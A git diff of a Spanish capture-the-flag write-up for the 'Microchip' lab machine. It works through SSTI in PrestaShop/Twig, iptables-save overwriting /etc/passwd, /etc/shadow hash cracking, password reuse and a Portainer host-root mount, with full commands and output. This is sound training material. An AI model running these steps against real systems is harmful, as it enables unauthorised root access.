@@ -1,8 +1,8 @@
 ---
 layout: single
 title: Microchip - TheHackerLabs
-excerpt: "."
-date: 2026-02-07
+excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, nos dirigimos a la página web activa en el puerto 80, siendo que después de analizarla y de aplicarle Fuzzing, descubrimos que utiliza Twig, lo que nos da un indicio de que puede ser vulnerable a Server Side Template Injection (SSTI). Encontramos un campo vulnerable a SSTI y logramos aplicar una Reverse Shell que nos da acceso a la máquina víctima, pero descubrimos que entramos a un contenedor de Docker. Dentro del contenedor, vemos que nuestro usuario puede usar el comando iptables e iptables-save como Root, lo que nos permite escalar privilegios y ser Root en el contenedor. Ahí mismo, leemos el Hash de la contraseña de un usuario registrado en el contenedor, que después crackeamos con JohnTheRipper. Probamos las credenciales en el servicio SSH, obteniendo acceso a la máquina víctima y con esas mismas credenciales, tenemos acceso al portal de Portainer. En dicho portal, creamos una montura de la raíz principal de la máquina víctima, permitiéndonos modificar el archivo /etc/passwd para cambiar la contraseña del Root y así escalar privilegios desde una sesión en el servicio SSH."
+date: 2026-02-09
 classes: wide
 header:
   teaser: /assets/images/THL-writeup-microchip/microchip.png
@@ -13,21 +13,62 @@ categories:
   - Medium Machine
 tags:
   - Linux
-  - 
-  - 
+  - SSH
+  - Docker
+  - Portainer.io
+  - CMS PrestaShop
+  - Web Enumeration
+  - Fuzzing
+  - Server Side Template Injection (SSTI)
+  - Twig - SSTI (PHP)
+  - Automating SSTI (SSTImap)
+  - Abusing Sudoers Privilege On iptables and iptables-save Binaries
+  - Unauthorized Root Password Modification Via /etc/passwd
+  - Privesc - Abusing Sudoers Privilege On iptables and iptables-save Binaries
+  - Privesc - Unauthorized Root Password Modification Via /etc/passwd
+  - Cracking Hash
+  - Cracking SHA-512 Hash
+  - Password Reuse
+  - Abusing Portainer Portal to Mounting The Host Root Filesystem
+  - Privesc - Abusing Portainer Portal to Mounting The Host Root Filesystem
   - OSCP Style
 ---
-![](/assets/images/THL-writeup-microchip/microchip.png)
+<p align="center">
+<img src="/assets/images/THL-writeup-microchip/microchip.png">
+</p>
 
-texto
+Esta fue una máquina algo complicada. Después de analizar los escaneos, nos dirigimos a la página web activa en el **puerto 80**, siendo que después de analizarla y de aplicarle 
+**Fuzzing**, descubrimos que utiliza **Twig**, lo que nos da un indicio de que puede ser vulnerable a **Server Side Template Injection (SSTI)**. Encontramos un campo vulnerable a 
+**SSTI** y logramos aplicar una **Reverse Shell** que nos da acceso a la máquina víctima, pero descubrimos que entramos a un **contenedor de Docker**. Dentro del contenedor, vemos 
+que nuestro usuario puede usar el comando **iptables** e **iptables-save** como **Root**, lo que nos permite escalar privilegios y ser **Root** en el contenedor. Ahí mismo, leemos el 
+Hash de la contraseña de un usuario registrado en el contenedor, que después crackeamos con **JohnTheRipper**. Probamos las credenciales en el **servicio SSH**, obteniendo acceso a 
+la máquina víctima y con esas mismas credenciales, tenemos acceso al portal de **Portainer**. En dicho portal, creamos una montura de la raíz principal de la máquina víctima, 
+permitiéndonos modificar el archivo `/etc/passwd` para cambiar la contraseña del **Root** y así escalar privilegios desde una sesión en el **servicio SSH**.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *wappalizer*
+* *ffuf*
+* *gobuster*
+* *nc*
+* *git*
+* *python3*
+* *source*
+* *pip*
+* *sstimap.py*
+* *cat*
+* *grep*
+* *sudo*
+* *GTFOBins*
+* *openssl*
+* *iptables*
+* *iptables-save*
+* *su*
+* *JohnTheRipper*
+* *nxc*
+* *ssh*
+* *sed*
 
 
 <br>
@@ -43,17 +84,20 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+				<li><a href="#Puerto9k">Analizando Página Web del Puerto 9000</a></li>
+				<li><a href="#fuzz">Fuzzing</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#SSTI">Identificando Campo Vulnerable a Server Side Template Injection (SSTI)</a></li>
+				<li><a href="#SSTIauto">Utilizando Herramienta SSTImap para Identificar y Explotar Server Side Template Inyection (SSTI)</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#PrivescDocker">Abusando de Permisos Sudoers Sobre Binarios iptables e iptables-save para Escalar Privilegios en Contenedor de Docker</a></li>
+				<li><a href="#Cracking">Crackeando Contraseña del Usuario kike del Archivo /etc/shadow</a></li>
+				<li><a href="#Portainer">Escalando Privilegios con Portainer</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -225,7 +269,7 @@ Veamos qué nos dice **Wappalizer**:
 <img src="/assets/images/THL-writeup-microchip/Captura2.png">
 </p>
 
-Hay bastantes herramientas y entre ellas me llama la atención el uso de un **Ecommerce** llamado **PrestaShop**:
+Hay bastantes herramientas y, entre ellas, me llama la atención el uso de un **Ecommerce** llamado **PrestaShop**:
 
 | **CMS PrestaShop** |
 |:------------------:|
@@ -263,7 +307,7 @@ Veamos qué nos dice **Wappalizer**:
 
 No hay mucho que destacar.
 
-Investiguemos que es **Portainer.io**:
+Investiguemos qué es **Portainer.io**:
 
 | **Portainer.io** |
 |:----------------:|
@@ -421,9 +465,9 @@ Finished
 
 <br>
 
-Encontramos bastantes resultados, pero solamente enfoquemonos en los siguientes.
+Encontramos bastantes resultados, pero solamente enfoquémonos en los siguientes.
 
-Si vemos el archivo **INSTALL.txt**, veremos la versión que se esta usando de **PrestaShop**:
+Si vemos el archivo **INSTALL.txt**, veremos la versión que se está usando de **PrestaShop**:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-microchip/Captura6.png">
@@ -435,7 +479,7 @@ También podemos ver el archivo **robots.txt**, en donde encontraremos los pará
 <img src="/assets/images/THL-writeup-microchip/Captura7.png">
 </p>
 
-Algo interesante que podemos encontrar es el directorio `/src` en donde podremos ver donde se guarda toda la instalación del CMS:
+Algo interesante que podemos encontrar es el directorio `/src` en donde podremos ver dónde se guarda toda la instalación del CMS:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-microchip/Captura8.png">
@@ -447,7 +491,7 @@ Y si entramos al directorio **PrestaShopBundle**, veremos un directorio llamado 
 <img src="/assets/images/THL-writeup-microchip/Captura9.png">
 </p>
 
-Investiguemos que es **Twig**:
+Investiguemos qué es **Twig**:
 
 | **Twig** |
 |:--------:|
@@ -455,9 +499,9 @@ Investiguemos que es **Twig**:
 
 <br>
 
-Al ver que es un motor de plantillas, puede que sea vulnerable a **Server Side Template Injection (SSTI)**, lo que nos permitiria ejecutar comandos dentro de la página.
+Al ver que es un motor de plantillas, puede que sea vulnerable a **Server Side Template Injection (SSTI)**, lo que nos permitiría ejecutar comandos dentro de la página.
 
-La cuestión es saber donde se puede probar, por lo que tendremos que buscar en toda la página web algún campo o parámetro vulnerable.
+La cuestión es saber dónde se puede probar, por lo que tendremos que buscar en toda la página web algún campo o parámetro vulnerable.
 
 
 <br>
@@ -508,7 +552,7 @@ Pero curiosamente, casi todos los payloads no parecen funcionar, a excepción de
 ```
 {% endraw %}
 
-Aunque si utilizamos el siguiente payload, funcionara y veremos que se ejecuta el comando:
+Aunque si utilizamos el siguiente payload, funcionará y veremos que se ejecuta el comando:
 
 {% raw %}
 ```bash
@@ -536,7 +580,7 @@ Utiliza el siguiente payload:
 ```
 {% endraw %}
 
-Pruebala:
+Pruébala:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-microchip/Captura13.png">
@@ -555,16 +599,35 @@ www-data
 ```
 Estamos dentro.
 
+Obtengamos una sesión interactiva:
+```bash
+# Paso 1:
+script /dev/null -c bash
+
+# Paso 2:
+CTRL + Z
+
+# Paso 3:
+stty raw -echo; fg
+
+# Paso 4:
+reset -> xterm
+
+# Paso 5:
+export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
+```
+Continuemos.
+
 <br>
 
 <h2 id="SSTIauto">Utilizando Herramienta SSTImap para Identificar y Explotar Server Side Template Inyection (SSTI)</h2>
 
-Existe una herramienta llamada SSTImap que sirve para identificar y explotar **SSTI**.
+Existe una herramienta llamada **SSTImap** que sirve para identificar y explotar **SSTI**.
 
 Aquí la puedes encontrar:
 * <a href="https://github.com/vladko312/SSTImap/tree/master" target="_blank">Repositorio de vladko312: SSTImap</a>
 
-Para utilizarla, deberas clonar el repositorio e instalar los requerimientos de la herramienta.
+Para utilizarla, deberás clonar el repositorio e instalar los requerimientos de la herramienta.
 
 Puedes hacerlo de la siguiente forma:
 ```bash
@@ -602,7 +665,7 @@ Funciona correctamente.
 
 Para el uso de esta herramienta, debemos identificar un parámetro que pueda probar.
 
-Digamos que no hemos identificado un parámetro vulnerable y queremos probar varios, entonces debemos generar una lista como la siguiente:
+Digamos que no hemos identificado un parámetro vulnerable y queremos probar varios; entonces debemos generar una lista como la siguiente:
 ```bash
 cat requests.txt
 http://microchip.thl/index.php?order=test
@@ -692,7 +755,7 @@ www-data
 ```
 Estamos dentro.
 
-Puedes seguir con esta sesión o con la primera que obtuvimos, yo seguire con la primera.
+Puedes seguir con esta sesión o con la primera que obtuvimos; yo seguiré con la primera.
 
 
 <br>
@@ -704,64 +767,304 @@ Puedes seguir con esta sesión o con la primera que obtuvimos, yo seguire con la
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="PrivescDocker">Abusando de Permisos Sudoers Sobre Binarios iptables e iptables-save para Escalar Privilegios en Contenedor de Docker</h2>
 
+Observa el **prompt**, siendo un indicativo de que estamos dentro de un **contenedor de Docker**.
+
+Veamos qué usuarios existen dentro del contenedor:
 ```bash
+www-data@62ca60255545:/var/www/prestashop$ cat /etc/passwd | grep 'bash'
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+kike:x:1001:1001:,,,:/home/kike:/bin/bash
+```
+Tenemos dos usuarios, pero el de interés es el **usuario kike**.
 
+Veamos si podemos entrar a su directorio:
+```bash
+kike:x:1001:1001:,,,:/home/kike:/bin/bash
+www-data@62ca60255545:/var/www/prestashop$ ls -la /home
+total 16
+drwxr-xr-x 1 root   root   4096 Apr 25  2025 .
+drwxr-xr-x 1 root   root   4096 Apr 25  2025 ..
+drwxr-x--- 2 kike   kike   4096 Apr 25  2025 kike
+drwxr-x--- 2 ubuntu ubuntu 4096 Apr  4  2025 ubuntu
+```
+No podemos.
+
+Veamos si de casualidad nuestro usuario tiene algún privilegio:
+```bash
+www-data@62ca60255545:/var/www/prestashop$ sudo -l
+Matching Defaults entries for www-data on 62ca60255545:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User www-data may run the following commands on 62ca60255545:
+    (root) NOPASSWD: /usr/sbin/iptables
+    (root) NOPASSWD: /usr/sbin/iptables-save
+```
+Muy bien, tenemos dos binarios que podemos usar como **Root**.
+
+Investigando un poco, encontramos una forma de usar estos binarios para modificar archivos que solo el **Root** puede hacer, esto con la **guía de GTFOBins**:
+* <a href="https://gtfobins.org/gtfobins/iptables-save/" target="_blank">GTFOBins: iptables-save</a>
+
+Además, el siguiente blog explica cómo podemos abusar de estos binarios para sobreescribir la contraseña del **Root** en el archivo `/etc/passwd`:
+* <a href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/" target="_blank">A Journey From sudo iptables To Local Privilege Escalation</a>
+
+Puedes hacer todas las pruebas que menciona el blog, esto para asegurarte de que funciona esta escalada de privilegios.
+
+En mi caso, probaré la escalada directamente.
+
+Primero, creamos la contraseña con la herramienta **openssl**:
+```bash
+www-data@62ca60255545:/var/www/prestashop$ openssl passwd jakiado123
+$1$IkT0H6Vg$BsJKEZfHdvf9Wl/wA0y4v0
 ```
 
+Usaremos la misma entrada del usuario **Root** en el `/etc/passwd`, y ahí reemplazamos la **x** con el hash que obtuvimos del comando anterior, todo esto dentro del comando de iptables para sobreescribir archivos:
 ```bash
+www-data@62ca60255545:/var/www/prestashop$ sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nroot:$1$IkT0H6Vg$BsJKEZfHdvf9Wl/wA0y4v0:0:0:root:/root:/bin/bash\n'
+```
+Esto añade la contraseña que creamos como una regla para poder inyectarla en un archivo que queramos.
 
+Revisamos que la regla se haya creado correctamente:
+```bash
+www-data@62ca60255545:/var/www/prestashop$ sudo iptables -S
+-P INPUT ACCEPT
+-P FORWARD ACCEPT
+-P OUTPUT ACCEPT
+-A INPUT -i lo -m comment --comment DATA -j ACCEPT
+-A INPUT -i lo -m comment --comment "
+root:$1$IkT0H6Vg$BsJKEZfHdvf9Wl/wA0y4v0:0:0:root:/root:/bin/bash
+" -j ACCEPT
 ```
 
+Guardamos la regla en el archivo deseado, siendo el `/etc/passwd`:
 ```bash
-
+www-data@62ca60255545:/var/www/prestashop$ sudo iptables-save -f /etc/passwd
 ```
 
+Por último, probamos si funcionó autenticándonos como **Root** y usando la contraseña que escogimos:
 ```bash
+www-data@62ca60255545:/var/www/prestashop$ su root
+Password: 
+root@62ca60255545:/var/www/prestashop# whoami
+root
+```
+Ya somos **Root**.
 
+El problema aquí es que no tenemos ninguna flag ni del usuario ni del **Root**:
+```bash
+root@62ca60255545:/var/www/prestashop# cd /root
+root@62ca60255545:~# ls -la
+total 44
+drwx------ 1 root root 4096 Apr 25  2025 .
+drwxr-xr-x 1 root root 4096 Apr 25  2025 ..
+lrwxrwxrwx 1 root root    9 Apr 25  2025 .bash_history -> /dev/null
+-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
+drwxr-xr-x 4 root root 4096 Apr 25  2025 .cache
+drwxr-xr-x 3 root root 4096 Apr 25  2025 .composer
+drwx------ 3 root root 4096 Apr 25  2025 .launchpadlib
+drwxr-xr-x 1 root root 4096 Apr 25  2025 .local
+drwxr-xr-x 5 root root 4096 Apr 25  2025 .npm
+-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
+-rw------- 1 root root    0 Apr 25  2025 .python_history
+drwx------ 2 root root 4096 Apr 25  2025 .ssh
+-rw-r--r-- 1 root root  248 Apr 25  2025 .wget-hsts
+root@62ca60255545:~# la -la /home/kike/
+total 20
+drwxr-x--- 2 1001 kike 4096 Apr 25  2025 .
+drwxr-xr-x 1 root root 4096 Apr 25  2025 ..
+lrwxrwxrwx 1 1001 kike    9 Apr 25  2025 .bash_history -> /dev/null
+-rw-r--r-- 1 1001 kike  220 Apr 25  2025 .bash_logout
+-rw-r--r-- 1 1001 kike 3771 Apr 25  2025 .bashrc
+-rw-r--r-- 1 1001 kike  807 Apr 25  2025 .profile
+```
+Debemos encontrar una forma de escapar de este contenedor.
+
+<br>
+
+<h2 id="Cracking">Crackeando Contraseña del Usuario kike del Archivo /etc/shadow</h2>
+
+Si revisamos el archivo `/etc/shadow`, encontraremos el hash de la contraseña del **usuario kike**:
+```bash
+root@62ca60255545:~# cat /etc/shadow
+...
+kike:$6$80f9cd16f4cd91f8$Vyinwb3YvcD8zOm0jmeEyT4oJptpkcnjPE/OMA0qFlApow4T9562N7yZD2o/TxirEsKAopSZamfG/2iif/xMI/:20203:0:99999:7:::
+```
+
+Podemos intentar crackear este hash; solo copia hasta donde termina el hash y guárdalo en un archivo:
+```bash
+cat kikeHash
+kike:$6$80f9cd16f4cd91f8$Vyinwb3YvcD8zOm0jmeEyT4oJptpkcnjPE/OMA0qFlApow4T9562N7yZD2o/TxirEsKAopSZamfG/2iif/xMI/
+```
+
+Utilizaremos la herramienta **JohnTheRipper** para crackear el hash:
+```bash
+john -w:/usr/share/wordlists/rockyou.txt kikeHash
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+**********  (kike)     
+1g 0:00:00:06 DONE (2026-02-09 18:08) 0.1602g/s 2276p/s 2276c/s 2276C/s goodman..community
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+Tenemos la contraseña.
+
+Probemos si funciona contra el **servicio SSH** de la máquina víctima usando la herramienta **netexec**:
+```bash
+nxc ssh 192.168.100.190 -u 'kike' -p '**********'
+SSH         192.168.100.190   22     192.168.100.190    [*] SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u5
+SSH         192.168.100.190   22     192.168.100.190    [+] kike:qwertyuiopasdfg  Linux - Shell access!
+```
+Sí funciona.
+
+Entremos al **SSH**:
+```bash
+ssh kike@192.168.100.190
+kike@192.168.100.190's password: 
+Linux TheHackersLabs-Microchip 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
+...
+Last login: Sun Feb  8 06:38:08 2026
+kike@TheHackersLabs-Microchip:~$
+```
+Estamos dentro.
+
+Aquí encontraremos la flag del usuario:
+```bash
+kike@TheHackersLabs-Microchip:~$ ls
+user.txt
+kike@TheHackersLabs-Microchip:~$ cat user.txt
+...
 ```
 
 <br>
 
-<h2 id=""></h2>
+<h2 id="Portainer">Escalando Privilegios con Portainer</h2>
 
+Dentro de la máquina víctima no hay mucho que podamos hacer; sin embargo, probando las mismas credenciales del **usuario kike**, logramos ganar acceso al portal de **Portainer**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-microchip/Captura14.png">
+</p>
+
+Ahí mismo podemos ver que se puede gestionar el contenedor actual.
+
+Si entramos ahí, veremos que hay 2 contenedores activos:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-microchip/Captura15.png">
+</p>
+
+<p align="center">
+<img src="/assets/images/THL-writeup-microchip/Captura16.png">
+</p>
+
+Investigando una forma de escalar privilegios con esta herramienta, encontré el siguiente blog:
+* <a href="https://rioasmara.com/2021/08/15/use-portainer-for-privilege-escalation/" target="_blank">Use Portainer for Privilege Escalation</a>
+
+Aunque se muestra una versión de Portainer un poco vieja, el procedimiento es casi el mismo.
+
+La idea es crear una montura de la máquina víctima dentro de un contenedor, de manera que cualquier modificación que realicemos se vea reflejada en la máquina principal.
+
+Primero, le damos al botón **Add Container**, le damos nombre al contenedor y escogemos una imagen:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-microchip/Captura17.png">
+</p>
+
+Bajando a la sección avanzada, escogemos la opción **Interactive & TTY**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-microchip/Captura18.png">
+</p>
+
+Ahí mismo, cambiamos a la sección **Volumes** e indicamos dónde se guardará la montura (importante usar la opción **Bind**), y le indicamos el path que se tomará para crear la montura, siendo la raíz de la máquina víctima:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-microchip/Captura19.png">
+</p>
+
+Por último, creamos el contenedor:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-microchip/Captura20.png">
+</p>
+
+<p align="center">
+<img src="/assets/images/THL-writeup-microchip/Captura21.png">
+</p>
+
+Ahí está creado nuestro contenedor.
+
+Entra ahí y en la sección **Container Status**, verás una opción que es para obtener una consola interactiva; dale clic y activa la consola dándole al botón **Connect**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-microchip/Captura22.png">
+</p>
+
+<p align="center">
+<img src="/assets/images/THL-writeup-microchip/Captura23.png">
+</p>
+
+<p align="center">
+<img src="/assets/images/THL-writeup-microchip/Captura24.png">
+</p>
+
+Listo, tenemos una consola interactiva.
+
+Podemos buscar la flag del **Root** en la ruta `/mnt/root/root`:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-microchip/Captura25.png">
+</p>
+
+Con esto, podemos dar por terminada la máquina, pero gracias a la opción **Bind**, podemos realizar cambios en este contenedor que se verán reflejados en la máquina principal.
+
+Entonces, podemos aplicar el mismo método de cambiar la contraseña del **Root** como lo hicimos en el primer contenedor.
+
+Creamos una contraseña con **openssl**:
 ```bash
-
+kike@TheHackersLabs-Microchip:~$ openssl passwd jakiado123
+$1$3/9fo81P$cMHPiWeUcR/r1Fbu6z728/
 ```
 
+Sobreescribimos el archivo `/etc/passwd` con el comando **sed** y usando el hash que obtuvimos anteriormente:
 ```bash
-
+sed -i 's|^root:x:|root:$1$3/9fo81P$cMHPiWeUcR/r1Fbu6z728/:0:0:root:/root:/bin/bash|' /mnt/root/etc/passwd
 ```
 
-```bash
+<p align="center">
+<img src="/assets/images/THL-writeup-microchip/Captura26.png">
+</p>
 
+Funciona, podemos comprobar que se realizo el cambio si en nuestra sesión del **SSH** vemos el archivo `/etc/passwd`:
+```bash
+kike@TheHackersLabs-Microchip:~$ cat /etc/passwd | grep 'bash'
+root:$1$3/9fo81P$cMHPiWeUcR/r1Fbu6z728/:0:0:root:/root:/bin/bash
+kike:x:1001:1001:,,,:/home/kike:/bin/bash
 ```
 
+Ya solo nos autenticamos como **Root** en esta sesión:
 ```bash
-
+kike@TheHackersLabs-Microchip:~$ su root
+Contraseña: 
+root@TheHackersLabs-Microchip:/home/kike# whoami
+root
 ```
+Somos **Root**.
 
-<br>
-
-<h2 id=""></h2>
-
+Y obtenemos la última flag:
 ```bash
-
+root@TheHackersLabs-Microchip:/home/kike# cd /root
+root@TheHackersLabs-Microchip:~# ls
+prestashop  root.txt
+root@TheHackersLabs-Microchip:~# cat root.txt
+...
 ```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
+Con esto, terminamos la máquina.
 
 
 <br>
@@ -776,8 +1079,8 @@ Puedes seguir con esta sesión o con la primera que obtuvimos, yo seguire con la
 * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
 * https://github.com/vladko312/SSTImap
 * https://gtfobins.org/gtfobins/iptables-save/
-* 
-* 
+* https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/
+* https://rioasmara.com/2021/08/15/use-portainer-for-privilege-escalation/
 
 
 <br>
